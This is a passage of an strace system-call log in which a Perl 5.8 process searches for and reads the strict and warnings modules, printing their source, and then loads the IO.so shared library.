7464  07:18:53.238800 stat64("/usr/share/perl5/strict.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238813 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238825 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238853 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.238897 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
7464  07:18:53.238935 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
7464  07:18:53.238950 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c838) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.238961 _llseek(8, 0, [0], SEEK_CUR) = 0
7464  07:18:53.238980 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
7464  07:18:53.239117 _llseek(8, 598, [598], SEEK_SET) = 0
7464  07:18:53.239131 _llseek(8, 0, [598], SEEK_CUR) = 0
7464  07:18:53.239141 close(8)          = 0
7464  07:18:53.239178 stat64("/etc/perl/warnings.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.239193 stat64("/etc/perl/warnings.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.239206 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.239219 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.239232 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.239245 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.239258 stat64("/usr/lib/perl5/warnings.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.239270 stat64("/usr/lib/perl5/warnings.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.239283 stat64("/usr/share/perl5/warnings.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.239295 stat64("/usr/share/perl5/warnings.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.239308 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.239320 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.239345 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.239359 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
7464  07:18:53.239408 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
7464  07:18:53.239439 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c838) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.239449 _llseek(8, 0, [0], SEEK_CUR) = 0
7464  07:18:53.239467 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
7464  07:18:53.239828 brk(0x81b6000)    = 0x81b6000
7464  07:18:53.239884 brk(0x81b5000)    = 0x81b5000
7464  07:18:53.240001 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
7464  07:18:53.240476 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
7464  07:18:53.241199 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
7464  07:18:53.241340 read(8, "", 4096) = 0
7464  07:18:53.241382 close(8)          = 0
7464  07:18:53.241549 _llseek(6, 412, [412], SEEK_SET) = 0
7464  07:18:53.241565 _llseek(6, 0, [412], SEEK_CUR) = 0
7464  07:18:53.241575 close(6)          = 0
7464  07:18:53.241616 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
7464  07:18:53.241639 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
7464  07:18:53.241666 futex(0xb7f7b070, 0x81 /* FUTEX_??? */, 2147483647) = 0
7464  07:18:53.241682 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
7464  07:18:53.241695 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
7464  07:18:53.241786 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
7464  07:18:53.241811 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f7f000
7464  07:18:53.241840 mmap2(0xb7f83000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f83000
7464  07:18:53.241884 close(6)          = 0
7464  07:18:53.242047 stat64("/etc/perl/IO/Handle.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.242063 stat64("/etc/perl/IO/Handle.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.242077 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.242090 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.242104 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.242116 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.242130 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
